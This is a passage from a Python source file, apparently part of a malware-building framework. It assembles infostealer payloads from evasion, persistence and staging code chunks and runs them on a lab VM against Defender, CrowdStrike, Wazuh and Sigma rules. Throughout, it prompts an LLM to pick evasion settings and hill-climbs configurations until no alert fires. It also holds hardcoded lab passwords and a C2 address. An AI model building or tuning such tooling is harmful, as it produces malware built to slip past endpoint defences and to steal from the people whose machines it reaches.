        "self_delete": "evasion/self_delete",
        "timestomp": "evasion/timestomp",
        "memory_only_full": None,
        "blend_noise": "evasion/behavioral_pacing",
    }
    if af in af_map and af_map[af]:
        evasion_chunks.append(af_map[af])

    # Data staging chunk
    ds = config.get("data_staging", "memory_only")
    ds_map = {
        "registry": "core/stage_registry",
        "ads": "core/stage_ads",
    }
    if ds in ds_map and (CHUNKS_DIR / f"{ds_map[ds]}.c").exists():
        evasion_chunks.append(ds_map[ds])

    # Anti-analysis extras
    aa = config.get("anti_analysis", "none")
    aa_extras = {
        "canary_aware": "evasion/anti_sandbox",
        "geofence": "evasion/anti_sandbox",
        "exec_guardrails": "evasion/anti_sandbox",
    }
    if aa in aa_extras:
        evasion_chunks.append(aa_extras[aa])

    # Add proven evasion chunks that always help
    always_safe = ["evasion/header_stomp", "evasion/behavioral_pacing"]
    for chunk in always_safe:
        if chunk not in evasion_chunks and (CHUNKS_DIR / f"{chunk}.c").exists():
            evasion_chunks.append(chunk)

    if evasion_chunks:
        # Deduplicate and verify all chunks exist
        seen = set()
        valid_chunks = []
        for ec in evasion_chunks:
            if ec in seen:
                continue
            seen.add(ec)
            ext = ".h" if ec.endswith("strings") or ec.endswith("encrypt") and "aes" not in ec else ".c"
            if (CHUNKS_DIR / f"{ec}{ext}").exists() or (CHUNKS_DIR / f"{ec}.c").exists():
                valid_chunks.append(ec)
        if valid_chunks:
            lines.append("")
            lines.append("evasion:")
            for ec in valid_chunks:
                lines.append(f"  - {ec}")

    if persist_key != "none":
        persist_chunk = persist_map.get(persist_key, f"persist/{persist_key}")
        if (CHUNKS_DIR / f"{persist_chunk}.c").exists():
            lines.append(f"persist: {persist_chunk}")

    lines.extend([
        "",
        "vars:",
        '  C2_IP: "10.0.2.2"',
        '  C2_PORT: "9001"',
    ])

    if is_ad_recon:
        lines.extend([
            '  LDAP_USER: "it.admin"',
            '  LDAP_DOMAIN: "MALWARE"',
            '  LDAP_PASS: "Adm1nP@ss!"',
        ])

    return "\n".join(lines)


def format_selection_report(config, malware_type="infostealer"):
    """Format the current selection for display."""
    all_layers = get_all_layers(malware_type)
    type_layer_names = set(get_type_layers(malware_type).keys())
    lines = ["Layer Selection:"]
    for layer, option in config.items():
        layer_info = all_layers.get(layer, LAYERS.get(layer, {}))
        info = layer_info.get("options", {}).get(option, {})
        risk = info.get("risk", "?")
        desc = info.get("desc", "?")
        risk_icon = {"vlow": "●", "low": "◐", "medium": "◑", "high": "○"}.get(risk, "?")
        prefix = "  *" if layer in type_layer_names else "  "
        lines.append(f"{prefix}{risk_icon} {layer}: {option} — {desc}")
    return "\n".join(lines)


DIM_CATEGORIES = {
    "architectural": ["process", "execution", "api_resolve", "memory_residence"],
    "behavioral": ["exfil", "persistence", "timing", "data_staging",
                    "process_lifetime", "collection_strategy", "target_scope"],
    "evasion": ["anti_analysis", "anti_forensics", "data_obfuscation",
                "etw_method", "sleep_mode", "stack_presentation"],
}


def build_analysis_prompt(detection_text, current_config, malware_type="infostealer"):
    """Call 1: Analyze detection to identify which dimensions were caught.
    Returns (prompt, sys_prompt). ~200 input tokens."""
    all_layers = get_all_layers(malware_type)

    if len(detection_text) > 800:
        det_compact = detection_text[:400] + "\n...\n" + detection_text[-400:]
    else:
        det_compact = detection_text

    cat_lines = []
    for cat, dims in DIM_CATEGORIES.items():
        valid = [d for d in dims if d in all_layers]
        if valid:
            vals = [f"{d}={current_config.get(d, '?')}" for d in valid]
            cat_lines.append(f"  {cat.upper()}: {', '.join(vals)}")

    prompt = (
        f"Detection log:\n{det_compact}\n\n"
        f"Current {malware_type} config by category:\n"
        + "\n".join(cat_lines) + "\n\n"
        "Which dimensions were caught? Output:\n"
        "TRIGGER dimension_name REASON: what in the detection points to this\n"
        "Output 1-3 TRIGGER lines. Only name dimensions that the detection DIRECTLY implicates."
    )

    sys_prompt = (
        "You analyze EDR detection logs to identify which evasion dimension triggered the alert.\n"
        "RULES:\n"
        "1. If the detection names a 'Primary anomaly: dim val', that is your ONLY trigger. "
        "Other 'Observed' values are just context — they might be CORRECT.\n"
        "2. If no primary anomaly is named, identify the SINGLE most likely trigger from "
        "the detection description.\n"
        "3. Output 1 TRIGGER line (max 2 only if genuinely independent detections).\n"
        "4. Never list a dimension as TRIGGER just because it appears in 'Observed'.\n"
        "Output: TRIGGER dimension_name REASON: what in the detection points to this"
    )

    return prompt, sys_prompt


def parse_analysis_response(response_text, malware_type="infostealer"):
    """Parse Call 1 response. Returns list of (dim_name, reason) tuples."""
    all_layers = get_all_layers(malware_type)
    triggers = []
    for line in response_text.strip().split("\n"):
        line = line.strip()
        if line.startswith("TRIGGER "):
            parts = line.split(None, 2)
            if len(parts) >= 2:
                dim = parts[1]
                reason = parts[2] if len(parts) > 2 else ""
                if dim in all_layers:
                    triggers.append((dim, reason))
    if not triggers:
        import re
        for dim in all_layers:
            if re.search(rf'\bTRIGGER\b.*\b{dim}\b|\b{dim}\b.*\btrigger', response_text, re.I):
                triggers.append((dim, ""))
            elif re.search(rf'\b{dim}\b\s*(?:was|is|seems?|likely|caught|flagged|detected)',
                           response_text, re.I):
                triggers.append((dim, ""))
    return triggers[:2]


def build_fix_prompt(triggered_dims, current_config, elimination_info="", malware_type="infostealer"):
    """Call 2: Given triggered dimensions, pick replacements.
    Returns (prompt, sys_prompt). ~200-400 input tokens."""
    all_layers = get_all_layers(malware_type)

    # Parse tried values from elimination info to filter options
    import re as _re_fix
    tried_by_dim = {}
    if elimination_info:
        for m in _re_fix.finditer(r"(\w+): tried \[([^\]]+)\]", elimination_info):
            dim_name = m.group(1)
            vals = [v.strip().strip("'\"") for v in m.group(2).split(",")]
            tried_by_dim[dim_name] = set(vals)

    sections = []
    is_correlation = len(triggered_dims) > 1
    for dim, reason in triggered_dims:
        if dim not in all_layers:
            continue
        info = all_layers[dim]
        cur_val = current_config.get(dim, info["default"])
        tried = tried_by_dim.get(dim, set())
        tried.add(cur_val)
        opts = []
        for opt, opt_info in info["options"].items():
            if opt in tried:
                continue
            opts.append(f"{opt}({opt_info['risk'][0]})")
        if not opts:
            opts = [f"{opt}({opt_info['risk'][0]})" for opt, opt_info in info["options"].items()
                    if opt != cur_val]
        if "primary anomaly" in reason:
            label = f"TRIGGERED: {dim} (current: {cur_val} — DEFINITELY WRONG)"
        elif is_correlation:
            label = f"TRIGGERED: {dim} (current: {cur_val} — may be wrong)"
        else:
            label = f"TRIGGERED: {dim} (current: {cur_val} — WRONG)"
        sections.append(f"{label}\n  Pick from: {', '.join(opts)}")

    if is_correlation:
        prompt = (
            f"These {len(sections)} dimensions are checked TOGETHER as a correlation rule. "
            "ALL must be correct simultaneously. Change the DEFINITELY WRONG one first, "
            "then change others only if you think they're also wrong.\n\n"
        )
    else:
        prompt = "Change ONLY these triggered dimensions.\n\n"
    prompt += "\n".join(sections)

    prompt += (
        "\n\nOutput CHANGE lines only. Format: CHANGE dimension option REASON: why\n"
        "Pick the LOWEST risk option. One CHANGE per triggered dimension."
    )

    sys_prompt = (
        "You fix evasion configs. You are given the specific dimensions that triggered detection "
        "and their available options. Pick replacement values that avoid the detection pattern. "
        "Prefer low-risk (L) options over medium (M) or high (H). "
        "Output ONLY CHANGE lines. One per triggered dimension."
    )

    return prompt, sys_prompt


def build_llm_prompt(detection_text="", compile_error="", previous_config=None, malware_type="infostealer"):
    """Legacy single-call prompt. Used as fallback when no detection text (compile errors, initial config)."""
    if previous_config:
        all_layers = get_all_layers(malware_type)
        config = {}
        for layer, info in all_layers.items():
            if layer in previous_config:
                config[layer] = previous_config[layer]
            else:
                config[layer] = info["default"]
        config = apply_constraints(config, malware_type)
    else:
        config = select_layers(detection_text, compile_error, previous_config, malware_type=malware_type)

    all_layers = get_all_layers(malware_type)

    prompt = (
        f"You select evasion config for a {malware_type}. "
        "Output CHANGE lines. Format: CHANGE layer option REASON: why\n"
    )

    if compile_error:
        prompt += f"\nCOMPILE ERROR:\n{compile_error[:300]}\n"

    if detection_text:
        if len(detection_text) > 1800:
            det_compact = detection_text[:600] + "\n...\n" + detection_text[-1200:]
        else:
            det_compact = detection_text
        prompt += f"\nDETECTION:\n{det_compact}\n"

    prompt += "\nOPTIONS:\n"
    for layer in sorted(all_layers):
        info = all_layers[layer]
        opts = []
        for opt, opt_info in info["options"].items():
            cur = " *" if config.get(layer) == opt else ""
            opts.append(f"{opt}({opt_info['risk'][0]}){cur}")
        prompt += f"{layer}: {', '.join(opts)}\n"

    prompt += "\nCURRENT: " + ", ".join(f"{k}={config[k]}" for k in sorted(config) if k in all_layers) + "\n"

    if detection_text:
        prompt += "\nChange dimensions to avoid detection. Output CHANGE lines only.\n"
    else:
        prompt += "\nConfig is working. Output CONFIRM or CHANGE lines.\n"

    return prompt, config


def parse_llm_response(response_text, auto_config, malware_type="infostealer"):
    """Parse LLM CHANGE/CONFIRM response and return updated config."""
    config = dict(auto_config)
    all_layers = get_all_layers(malware_type)
    found_change = False
    for line in response_text.strip().split("\n"):
        line = line.strip()
        if line.startswith("CHANGE "):
            parts = line.split(None, 3)
            if len(parts) >= 3:
                layer = parts[1]
                option = parts[2]
                if layer not in all_layers:
                    # LLM may have used current value instead of dim name
                    # e.g. "CHANGE ppid_spoof_runtimebroker ppid_spoof_sihost"
                    for real_layer, info in all_layers.items():
                        if layer in info["options"] and option in info["options"]:
                            layer = real_layer
                            break
                if layer in all_layers:
                    if option in all_layers[layer]["options"]:
                        config[layer] = option
                        found_change = True
                    else:
                        # Fuzzy match: LLM may misspell (e.g. ife_debugger → ifeo_debugger)
                        best, best_dist = None, 3
                        for valid_opt in all_layers[layer]["options"]:
                            if len(option) < 4:
                                continue
                            # Edit distance (simple DP)
                            a, b = option, valid_opt
                            if abs(len(a) - len(b)) >= best_dist:
                                continue
                            prev = list(range(len(b) + 1))
                            for i, ca in enumerate(a, 1):
                                curr = [i] + [0] * len(b)
                                for j, cb in enumerate(b, 1):
                                    curr[j] = min(prev[j] + 1, curr[j-1] + 1,
                                                  prev[j-1] + (ca != cb))
                                prev = curr
                            d = prev[-1]
                            if d < best_dist:
                                best, best_dist = valid_opt, d
                        if best:
                            config[layer] = best
                            found_change = True
    if not found_change:
        import re
        for layer in all_layers:
            for m in re.finditer(
                rf'\b{layer}\b[:\s]+[`"\']?(\w+)[`"\']?', response_text
            ):
                opt = m.group(1)
                if opt in all_layers[layer]["options"] and opt != auto_config.get(layer):
                    config[layer] = opt
    return config


AV_DETECTION_CMDS = {
    "defender": 'powershell -Command "Get-MpThreatDetection | Where-Object { $_.InitialDetectionTime -gt (Get-Date).AddMinutes(-3) } | Select-Object -Last 3 | Format-List"',
    "wazuh": 'powershell -Command "Get-EventLog -LogName Application -Source OssecSvc -Newest 10 -After (Get-Date).AddMinutes(-3) -ErrorAction SilentlyContinue | Format-List"',
    "elastic": 'powershell -Command "Get-WinEvent -LogName Microsoft-Windows-Windows\\ Defender/Operational -MaxEvents 10 -ErrorAction SilentlyContinue | Where-Object { $_.Id -eq 1116 -or $_.Id -eq 1117 } | Where-Object { $_.TimeCreated -gt (Get-Date).AddMinutes(-3) } | Format-List"',
    "crowdstrike": 'powershell -Command "Get-EventLog -LogName Application -Source CsFalcon* -Newest 5 | Format-List"',
    "sentinelone": 'powershell -Command "Get-EventLog -LogName Application -Source SentinelOne* -Newest 5 | Format-List"',
    "carbon_black": 'powershell -Command "Get-EventLog -LogName Application -Source Cb* -Newest 5 | Format-List"',
}


_cached_edrs = None

def get_active_edrs():
    global _cached_edrs
    if _cached_edrs is not None:
        return _cached_edrs
    edrs_str = os.environ.get("MALGEN_ACTIVE_EDRS", "")
    if edrs_str:
        _cached_edrs = [e.strip() for e in edrs_str.split(",") if e.strip()]
        return _cached_edrs
    av_type = os.environ.get("MALGEN_AV_TYPE", "defender")
    edrs = [av_type]
    if "crowdstrike" not in edrs:
        import subprocess as _sp
        vm_port = int(os.environ.get("VM_PORT", "10022"))
        vm_user = os.environ.get("VM_USER", "vmuser")
        vm_pass = os.environ.get("VM_PASS", "vmuser123")
        try:
            r = _sp.run(
                f"sshpass -p '{vm_pass}' ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no "
                f"-p {vm_port} {vm_user}@localhost 'sc query csfalconservice'",
                shell=True, capture_output=True, text=True, timeout=10)
            if "RUNNING" in r.stdout:
                edrs.append("crowdstrike")
        except Exception:
            pass
    _cached_edrs = edrs
    return _cached_edrs


def get_detection_cmd():
    edrs = get_active_edrs()
    cmds = []
    for edr in edrs:
        if edr in AV_DETECTION_CMDS:
            cmds.append(AV_DETECTION_CMDS[edr])
    return " && ".join(cmds) if cmds else AV_DETECTION_CMDS["defender"]


def check_wazuh_indexer(minutes=3, min_level=8):
    """Query Wazuh indexer on host for high-level alerts from VM agent."""
    import urllib.request
    import json as _json
    indexer_url = os.environ.get("WAZUH_INDEXER_URL", "http://localhost:9201")
    body = _json.dumps({
        "size": 10,
        "sort": [{"timestamp": "desc"}],
        "query": {
            "bool": {
                "must": [
                    {"term": {"agent.id": "001"}},
                    {"range": {"rule.level": {"gte": min_level}}},
                    {"range": {"timestamp": {"gte": f"now-{minutes}m"}}},
                ]
            }
        },
    }).encode()
    try:
        req = urllib.request.Request(
            f"{indexer_url}/wazuh-alerts-*/_search",
            data=body,
            headers={"Content-Type": "application/json"},
        )
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = _json.loads(resp.read())
            hits = data.get("hits", {}).get("hits", [])
            if not hits:
                return ""
            lines = []
            for h in hits:
                rule = h["_source"].get("rule", {})
                mitre = rule.get("mitre", {})
                mitre_str = ",".join(mitre.get("id", [])) if mitre else ""
                lines.append(
                    f"WAZUH Level={rule.get('level')} [{rule.get('id')}] "
                    f"{rule.get('description', '')[:100]} "
                    f"{'MITRE:' + mitre_str if mitre_str else ''}"
                )
            return "\n".join(lines)
    except Exception:
        return ""


def check_sigma_rules(vm_port=10022, vm_user="vmuser", vm_pass="vmuser123", minutes=3):
    """Pull Sysmon EVTX from VM, run Chainsaw with full Sigma rules. Return detection text."""
    import subprocess as _sp
    import tempfile
    import json as _json

    project_dir = str(Path(__file__).parent.parent.parent)
    chainsaw = f"{project_dir}/tools/chainsaw/chainsaw"
    if not Path(chainsaw).exists():
        return ""

    sigma_dirs = [
        f"{project_dir}/tools/sigma/rules/windows",
        f"{project_dir}/tools/sigma/rules-threat-hunting/windows",
        f"{project_dir}/tools/sigma/rules-emerging-threats",
        f"{project_dir}/tools/sigma/rules/custom",
    ]
    mappings = f"{project_dir}/tools/chainsaw/mappings/sigma-event-logs-all.yml"

    ssh = f"sshpass -p '{vm_pass}' ssh -o StrictHostKeyChecking=no -p {vm_port} {vm_user}@localhost"
    scp = f"sshpass -p '{vm_pass}' scp -o StrictHostKeyChecking=no -P {vm_port}"

    with tempfile.TemporaryDirectory() as tmpdir:
        evtx_local = f"{tmpdir}/sysmon.evtx"
        evtx_remote = r"C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx"

        # Export recent Sysmon events via wevtutil
        _sp.run(f"""{ssh} 'wevtutil epl "Microsoft-Windows-Sysmon/Operational" C:\\Users\\{vm_user}\\Desktop\\sysmon_export.evtx /ow:true'""",
                shell=True, capture_output=True, timeout=30)
        r = _sp.run(f"""{scp} {vm_user}@localhost:'C:\\Users\\{vm_user}\\Desktop\\sysmon_export.evtx' {evtx_local}""",
                    shell=True, capture_output=True, timeout=30)
        _sp.run(f"""{ssh} 'del C:\\Users\\{vm_user}\\Desktop\\sysmon_export.evtx 2>NUL'""",
                shell=True, capture_output=True)

        if r.returncode != 0 or not Path(evtx_local).exists():
            return ""

        cmd = [chainsaw, "hunt", evtx_local]
        for sd in sigma_dirs:
            if Path(sd).exists():
                cmd.extend(["-s", sd])
        cmd.extend(["--mapping", mappings, "--skip-errors", "--json"])

        result = _sp.run(cmd, capture_output=True, text=True, timeout=120)
        if result.returncode != 0:
            return ""

        try:
            detections = _json.loads(result.stdout) if result.stdout.strip() else []
        except _json.JSONDecodeError:
            return ""

        if not detections:
            return ""

        # Filter to recent events and medium+ severity
        alerts = []
        for d in detections:
            level = d.get("level", "").lower()
            if level in ("critical", "high", "medium"):
                name = d.get("name", d.get("title", "?"))[:80]
                sigma_level = level.upper()
                alerts.append(f"SIGMA {sigma_level}: {name}")

        if not alerts:
            return ""
        return "\n".join(alerts[:10])


def check_crowdstrike(vm_port=10022, vm_user="vmuser", vm_pass="vmuser123",
                      check_binary=True, c2_rc=None):
    """Check CrowdStrike Falcon detections on VM.

    Returns (cs_fail, cs_text) where cs_fail is True if Falcon quarantined/killed,
    and cs_text is a summary string for detection parsing.
    """
    if "crowdstrike" not in get_active_edrs():
        return False, ""

    import subprocess as _sp
    ssh = f"sshpass -p '{vm_pass}' ssh -o StrictHostKeyChecking=no -p {vm_port} {vm_user}@localhost"

    running = _sp.run(f"{ssh} 'sc query csfalconservice'",
                      shell=True, capture_output=True, text=True, timeout=15)
    if "RUNNING" not in running.stdout:
        return False, ""

    parts = []
    cs_killed = False

    if check_binary:
        exists = _sp.run(
            f"{ssh} 'if exist C:\\Users\\{vm_user}\\Desktop\\payload.exe (echo EXISTS) else (echo GONE)'",
            shell=True, capture_output=True, text=True, timeout=10)
        if "GONE" in exists.stdout:
            parts.append("CrowdStrike:Quarantined — Falcon removed binary")
            cs_killed = True

    proc = _sp.run(
        f"""{ssh} 'tasklist /fi "IMAGENAME eq payload.exe" /fo csv /nh 2>nul'""",
        shell=True, capture_output=True, text=True, timeout=10)
    proc_out = proc.stdout.replace("\r", "").strip()
    if c2_rc is not None and c2_rc != 0 and "payload.exe" not in proc_out.lower():
        parts.append("CrowdStrike:ProcessKilled — Falcon terminated payload process")
        cs_killed = True

    events = _sp.run(
        f"""{ssh} 'powershell -Command "(Get-WinEvent -LogName \\"CrowdStrike-Falcon Sensor-CSFalconService/Operational\\" -MaxEvents 50 -ErrorAction SilentlyContinue | Where-Object {{ $_.TimeCreated -gt (Get-Date).AddMinutes(-5) -and $_.LevelDisplayName -match \\"Warning|Error|Critical\\" }}).Count"'""",
        shell=True, capture_output=True, text=True, timeout=15)
    event_count = 0
    for line in events.stdout.replace("\r", "").strip().split("\n"):
        line = line.strip()
        if re.match(r'^\d+$', line):
            event_count = int(line)
            break
    if event_count > 0:
        parts.append(f"CrowdStrike:Events — {event_count} warning/error events in Falcon log")

    cs_text = "\n".join(parts)
    return cs_killed, cs_text


def _llm_call_raw(llm_url, sys_p, user_p, t=0.7):
    import requests
    r = requests.post(
        f"{llm_url}/v1/chat/completions",
        json={
            "model": LLM_MODEL,
            "messages": [
                {"role": "system", "content": sys_p},
                {"role": "user", "content": user_p},
            ],
            "max_tokens": 8192,
            "temperature": t,
        },
        timeout=600,
    )
    rj = r.json()
    if "error" in rj:
        err = rj["error"]
        raise ValueError(err.get("message", str(err)) if isinstance(err, dict) else str(err))
    text = rj["choices"][0]["message"].get("content") or ""
    reasoning = rj["choices"][0]["message"].get("reasoning_content") or ""
    if not text.strip() and reasoning:
        text = reasoning
    return text


def _build_next_config(all_layers, locked, suggested, suggest_idx, run_idx, malware_type,
                       last_clean_config=None):
    config = {}
    vary_set = set()
    if run_idx > 0 and last_clean_config and not locked and not suggested:
        rng = random.Random(run_idx * 31337)
        free_dims = [d for d in all_layers if d not in locked and d not in suggested]
        vary_set = set(rng.sample(free_dims, min(1, len(free_dims))))

    for dim, info in all_layers.items():
        opts = list(info["options"].keys())
        if not opts:
            continue
        if dim in locked:
            config[dim] = locked[dim]
        elif dim in suggested and suggest_idx.get(dim, 0) < len(suggested[dim]):
            idx = suggest_idx.get(dim, 0)
            config[dim] = suggested[dim][idx]
            suggest_idx[dim] = idx + 1
        elif dim in vary_set:
            config[dim] = opts[run_idx % len(opts)]
        elif last_clean_config and dim in last_clean_config:
            config[dim] = last_clean_config[dim]
        else:
            dim_hash = sum(ord(c) * (i + 1) for i, c in enumerate(dim))
            rng_dim = random.Random(run_idx * 31337 + dim_hash)
            config[dim] = rng_dim.choice(opts)

    config = apply_constraints(config, malware_type, protected=set(locked.keys()))
    return config


def _llm_strategy_call(llm_url, batch_this, all_layers, last_clean_config,
                       current_level, malware_type, strategy_history,
                       locked, resets_done, base_config=None):
    if base_config is not None:
        best_cfg = base_config
        best_dets = next((d for c, d in batch_this if c is base_config), [])
        best_count = len(best_dets)
    else:
        scored = [(cfg, dets, len(dets)) for cfg, dets in batch_this]
        scored.sort(key=lambda x: x[2])
        best_cfg, best_dets, best_count = scored[0]

    if best_count == 0 and base_config is None:
        return {"action": "explore", "lock": {}, "explore": [],
                "suggest": {}, "reasoning": "clean config found", "changes": {}}

    base_det_names = {dn for _, dn in best_dets} if base_config is not None else None
    det_evidence = {}
    n_configs = len(batch_this)
    for cfg, dets in batch_this:
        det_names_here = set()
        for det_json_str, det_name in dets:
            if base_det_names is not None and det_name not in base_det_names:
                continue
            det_names_here.add(det_name)
            if det_name not in det_evidence:
                try:
                    obj = json.loads(det_json_str)
                    det_evidence[det_name] = {
                        "description": obj.get("DetectDescription", "")[:200],
                        "severity": obj.get("SeverityName", "?"),
                        "tactic": obj.get("Tactic", ""),
                        "technique": obj.get("Technique", ""),
                        "trigger_vals": {},
                        "clean_vals": {},
                        "trigger_count": 0,
                    }
                except (json.JSONDecodeError, KeyError):
                    det_evidence[det_name] = {
                        "description": det_name,
                        "severity": "?", "tactic": "", "technique": "",
                        "trigger_vals": {}, "clean_vals": {},
                        "trigger_count": 0,
                    }
            ev = det_evidence[det_name]
            ev["trigger_count"] += 1
            for dim in all_layers:
                val = cfg.get(dim, "?")
                ev["trigger_vals"].setdefault(dim, {})
                ev["trigger_vals"][dim][val] = ev["trigger_vals"][dim].get(val, 0) + 1

        for det_name, ev in det_evidence.items():
            if det_name not in det_names_here:
                for dim in all_layers:
                    val = cfg.get(dim, "?")
                    ev["clean_vals"].setdefault(dim, {})
                    ev["clean_vals"][dim][val] = ev["clean_vals"][dim].get(val, 0) + 1

    best_det_names = {dn for _, dn in best_dets}
    ranked_dets = sorted(det_evidence.keys(),
                         key=lambda d: (0 if d in best_det_names else 1,
                                        -det_evidence[d]["trigger_count"]))
    ranked_dets = ranked_dets[:12]

    dimval_alerts = {}
    for cfg, dets in batch_this:
        for dim in all_layers:
            val = cfg.get(dim, "?")
            key = (dim, val)
            n_alerts = len(dets)
            if key not in dimval_alerts or n_alerts < dimval_alerts[key]:
                dimval_alerts[key] = n_alerts

    det_blocks = []
    for det_name in ranked_dets:
        ev = det_evidence[det_name]
        block = (f"[{ev['severity']}] {det_name} "
                 f"({ev['trigger_count']}/{n_configs} configs)\n"
                 f"  {ev['tactic']}/{ev['technique']}: {ev['description']}\n")
        correlations = []
        for dim in sorted(all_layers.keys()):
            trigger = ev["trigger_vals"].get(dim, {})
            clean = ev["clean_vals"].get(dim, {})
            if not trigger:
                continue
            trigger_only = set(trigger.keys()) - set(clean.keys())
            clean_only = set(clean.keys()) - set(trigger.keys())
            if not trigger_only and not clean_only:
                continue
            trigger_exclusive_pct = sum(trigger[v] for v in trigger_only) / max(ev["trigger_count"], 1)
            if trigger_exclusive_pct < 0.3 and len(clean_only) == 0:
                continue
            parts = []
            if trigger_only:
                vals = sorted(trigger_only)[:4]
                parts.append(f"triggers: {', '.join(vals)}")
            if clean_only:
                fixes = sorted(v for v in clean_only
                               if dimval_alerts.get((dim, v), best_count) < best_count)
                shifts = sorted(v for v in clean_only if v not in fixes)
                if fixes:
                    parts.append(f"FIXES: {', '.join(fixes[:4])}")
                if shifts:
                    parts.append(f"shifts (new alerts): {', '.join(shifts[:3])}")
                if not fixes and not shifts:
                    parts.append(f"clean: {', '.join(sorted(clean_only)[:4])}")
            correlations.append(f"    {dim}: {'; '.join(parts)}")
        correlations = correlations[:5]
        if correlations:
            block += "\n".join(correlations) + "\n"
        else:
            block += "    (fires on all tested values — likely combo or different dim)\n"
        det_blocks.append(block)

    best_str = ", ".join(f"{k}={best_cfg.get(k)}" for k in sorted(best_cfg.keys())
                         if k in all_layers)

    history_section = ""
    if strategy_history:
        recent = strategy_history[-10:]
        history_lines = []
        for entry in recent:
            changes = entry.get("changes", {})
            outcome = entry.get("outcome", "?")
            best = entry.get("best_alerts", "?")
            ch_str = ", ".join(f"{k}={v}" for k, v in changes.items()) if changes else "none"
            history_lines.append(f"  R{entry.get('batch', '?')}: {ch_str} -> {outcome} (best={best})")
        history_section = "RECENT HISTORY (last 10):\n" + "\n".join(history_lines) + "\n"

    dead_end = ""
    if len(strategy_history) >= 3:
        recent = strategy_history[-3:]
        if all(h.get("outcome") == "no_improvement" for h in recent):
            recent_changes = [list(h.get("changes", {}).keys()) for h in recent]
            changed_dims = set(d for dims in recent_changes for d in dims)
            dead_end = (
                f"STUCK: 3 rounds with no improvement. "
                f"Dims tried: {', '.join(changed_dims) if changed_dims else 'none'}. "
                f"Try a DIFFERENT dimension or change MULTIPLE dims at once.\n")

    involved_dims = set()
    for ev in det_evidence.values():
        for dim in ev["trigger_vals"]:
            trigger = ev["trigger_vals"].get(dim, {})
            clean = ev["clean_vals"].get(dim, {})
            if set(trigger.keys()) != set(clean.keys()):
                involved_dims.add(dim)
    for ev in det_evidence.values():
        for dim in ev["trigger_vals"]:
            clean = ev["clean_vals"].get(dim, {})
            if not clean:
                involved_dims.add(dim)
    if not involved_dims:
        involved_dims = {"process", "exfil", "api_resolve", "timing",
                         "persistence", "execution"}

    dim_opts = "AVAILABLE OPTIONS (relevant dimensions):\n"
    for d in sorted(involved_dims):
        if d in all_layers:
            opts = list(all_layers[d]["options"].keys())
            tried = set()
            for cfg, _ in batch_this:
                if d in cfg:
                    tried.add(cfg[d])
            untried = [o for o in opts if o not in tried]
            tried_str = ", ".join(sorted(tried))
            untried_str = ", ".join(untried[:10]) if untried else "all tried"
            dim_opts += f"  {d}: tried=[{tried_str}] untried=[{untried_str}]\n"

    other_dims = sorted(set(all_layers.keys()) - involved_dims)
    if other_dims:
        dim_opts += f"  Other dims (not correlated): {', '.join(other_dims)}\n"

    clean_section = ""
    if last_clean_config:
        changed = [k for k in best_cfg if k in all_layers
                   and best_cfg.get(k) != last_clean_config.get(k)]
        if changed:
            clean_section = (
                f"REGRESSION RISK: current config differs from last clean "
                f"on: {', '.join(f'{d}={best_cfg[d]}' for d in changed[:8])}\n")

    locked_section = ""
    if locked:
        locked_section = f"LOCKED DIMS (do not change): {', '.join(f'{k}={v}' for k, v in locked.items())}\n"

    prompt = f"""EDR evasion analysis for {malware_type}.

CURRENT BEST CONFIG ({best_count} alert{'s' if best_count != 1 else ''} remaining):
  {best_str}

{locked_section}{clean_section}{dead_end}
REMAINING DETECTIONS — what each alert says and which dimension values correlate:

{chr(10).join(det_blocks)}
{history_section}
{dim_opts}
TASK: Based on the detection descriptions and correlations above, decide what to change.
- The correlations show which dim values appear ONLY in detected configs vs clean configs
- If a detection fires on ALL values of a dimension, the cause is likely a DIFFERENT dimension or a combo
- If stuck, try changing 2+ dimensions simultaneously

Output ONLY valid JSON:
{{"change": {{"dim": "value"}}, "keep": {{"dim": "value"}}, "reset": false, "reasoning": "..."}}"""

    sys_prompt = (
        "You are an EDR detection analyst. You read detection logs "
        "and correlation data to determine which evasion configuration dimensions cause "
        "alerts. You reason about behavioral patterns — process lineage, network signatures, "
        "API call sequences — to pick the right evasion technique. "
        "Output ONLY valid JSON, no other text."
    )

    text = _llm_call_raw(llm_url, sys_prompt, prompt, t=0.3)

    strategy = {"change": {}, "keep": {}, "reset": False, "reasoning": ""}
    try:
        clean = re.sub(r'```json\s*', '', text)
        clean = re.sub(r'```\s*', '', clean)
        json_match = re.search(r'\{[^{}]*(?:\{[^{}]*\}[^{}]*)*\}', clean)
        if json_match:
            strategy = json.loads(json_match.group())
        else:
            strategy = json.loads(clean)
    except (json.JSONDecodeError, ValueError):
        pairs = re.findall(r'"(\w+)"\s*:\s*"([\w_]+)"', text)
        for dim, val in pairs:
            if dim in all_layers and val in all_layers[dim]["options"]:
                strategy["change"][dim] = val
        if "reset" in text.lower() and ("true" in text.lower()):
            strategy["reset"] = True

    raw_change = strategy.get("change", {})
    if "dimension_name" in raw_change and "new_value" in raw_change:
        dim_name = raw_change["dimension_name"]
        new_val = raw_change["new_value"]
        raw_change = {dim_name: new_val}
    valid_change = {}
    for dim, val in raw_change.items():
        if dim in all_layers and val in all_layers[dim]["options"]:
            valid_change[dim] = val
    valid_keep = {}
    for dim, val in strategy.get("keep", {}).items():
        if dim in all_layers and val in all_layers[dim]["options"]:
            valid_keep[dim] = val

    is_reset = bool(strategy.get("reset", False))

    return {
        "action": "reset" if is_reset else "explore",
        "lock": valid_keep,
        "explore": list(valid_change.keys()),
        "suggest": {d: [v] for d, v in valid_change.items()},
        "reasoning": strategy.get("reasoning", ""),
        "changes": valid_change,
    }


def _sim_hill_climb(config, malware_type, all_layers, evaluate_fn,
                    max_evals=2000, max_restarts=30, exam_name="A"):
    base = dict(config)
    base_alerts = len(evaluate_fn(base, malware_type, max_level=20, exam_name=exam_name))
    if base_alerts == 0:
        return base, 0, 1
    best_ever = base_alerts
    best_ever_config = dict(base)
    evals = 1
    restarts = 0
    dim_order = list(all_layers.keys())

    while evals < max_evals and restarts <= max_restarts:
        improved_this_pass = False
        for dim in dim_order:
            if evals >= max_evals:
                break
            opts = list(all_layers[dim]["options"].keys())
            current_val = base.get(dim)
            best_val = current_val
            best_count = base_alerts
            for val in opts:
                if val == current_val:
                    continue
                evals += 1
                test = dict(base)
                test[dim] = val
                test = apply_constraints(test, malware_type)
                test_dets = evaluate_fn(test, malware_type, max_level=20, exam_name=exam_name)
                if not test_dets:
                    return test, 0, evals
                if len(test_dets) < best_count:
                    best_count = len(test_dets)
                    best_val = val
                if evals >= max_evals:
                    break
            if best_val != current_val:
